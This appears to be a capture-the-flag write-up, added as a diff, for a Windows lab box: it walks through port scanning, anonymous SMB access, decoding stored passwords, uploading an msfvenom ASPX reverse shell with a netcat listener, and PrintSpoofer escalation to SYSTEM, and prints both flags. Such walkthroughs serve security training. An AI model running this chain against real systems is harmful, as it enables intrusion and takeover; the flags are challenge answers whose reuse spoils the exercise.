@@ -1,0 +1,107 @@
+Relevant CTF
+
+You have been assigned to a client that wants a penetration test 
+conducted on an environment due to be released to production in seven days.  
+Scope of Work
+The client requests 
+that an engineer conducts an assessment 
+of the provided virtual environment. The client has asked that minimal 
+information be provided about the assessment, wanting the engagement 
+conducted from the eyes of a malicious actor (black box penetration 
+test).  The client has asked that you secure two flags (no location 
+provided) as proof of exploitation:
+- User.txt
+- Root.txt
+Additionally, the client has provided the following scope allowances:
+- Any tools or techniques are permitted in this engagement, however we ask that you attempt manual exploitation first
+- Locate and note all vulnerabilities found
+- Submit the flags discovered to the dashboard
+- Only the IP address assigned to your machine is in scope
+- Find and report ALL vulnerabilities (yes, there is more than one path to root)
+
+ Full Port Scan
+```
+nmap -sC -sV -p- 10.129.178.147
+```
+The -p- flag scans all 65535 ports instead of just the default top 1000. This is critical because port 49663 — a second IIS web server — would have been completely missed with a default scan. Always do full port scans.
+Key findings:
+- Port 80, 49663 — Microsoft IIS 10.0 (Windows web server)
+- Port 445 — SMB (Windows Server 2016)
+- Port 3389 — RDP
+
+ SMB Enumeration (Anonymous/Null Session)
+bash
+```
+smbclient -L //10.129.178.147 -N
+```
+The -N flag attempts a null session — connecting with no credentials at all. This works when a server is misconfigured to allow anonymous access. The share nt4wrksv stood out immediately because it had no comment and was non-standard. Default shares like ADMIN,C, C ,C, IPC$ are expected — anything else is worth investigating.
+smbclient -L //10.129.178.147 -N
+Accessing the Share and Finding Credentials
+bash
+```
+smbclient //10.129.178.147/nt4wrksv -N
+```
+Inside the share was passwords.txt containing two encoded strings. The strings were identified as Base64 because of three giveaways — the == padding at the end, the character set only containing A-Z, a-z, 0-9, + and /, and the context of the file being named passwords.
+
+cat passwords.txt
+Decoded with:
+echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d
+echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d
+Result:
+- Bob : !P@$$W0rD!123
+- Bill : Juw4nnaM4n420696969!$$$
+
+
+I tried to login with both usernames to find something didnt get anything new
+
+Generating and Uploading a Reverse Shell
+IIS is Microsoft's web server and executes ASPX files (Active Server Pages). Since the nt4wrksv SMB share mapped directly to the IIS web root being served on port 49663, uploading an ASPX file via SMB meant IIS would execute it when visited in a browser.
+Generated the shell:
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_VPN_IP LPORT=4444 -f aspx -o shell.aspx
+start your listener:
+```
+nc -lvnp 4444
+```
+ connect to the share and upload:
+bash
+```
+smbclient //10.129.178.147/nt4wrksv -U Bob
+put shell.aspx
+```
+
+
+Triggered by visiting: ``` http://10.129.178.147:49663/nt4wrksv/shell.aspx
+
+This gave a reverse shell running as iis apppool\defaultapppool — a low privilege IIS service account.
+
+
+user flag - THM{fdk4ka34vk346ksxfr21tg789ktf45}
+
+Privilege Escalation via SeImpersonatePrivilege
+cmd
+```
+whoami /priv
+```
+The output showed SeImpersonatePrivilege was Enabled. This privilege allows a process to impersonate other users who authenticate to it. On Windows Server 2016, IIS service accounts almost always have this privilege enabled by design.
+The attack — called a Potato attack — tricks the system into authenticating as NT AUTHORITY\SYSTEM, then steals that token. PrintSpoofer is the tool that automates this on Windows Server 2016/2019.
+
+Downloaded PrintSpoofer on Kali:
+wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
+
+put PrintSpoofer64.exe
+
+Executed from the shell:
+cmd
+```
+cd C:\inetpub\wwwroot\nt4wrksv
+PrintSpoofer64.exe -i -c cmd
+whoami
+```
+Result: nt authority\system — full SYSTEM access.
+
+whoami
+C:\Users\Administrator\Desktop\root.txt
+root flag - THM{1fk5kf469devly1gl320zafgl345pv}
+
+
+
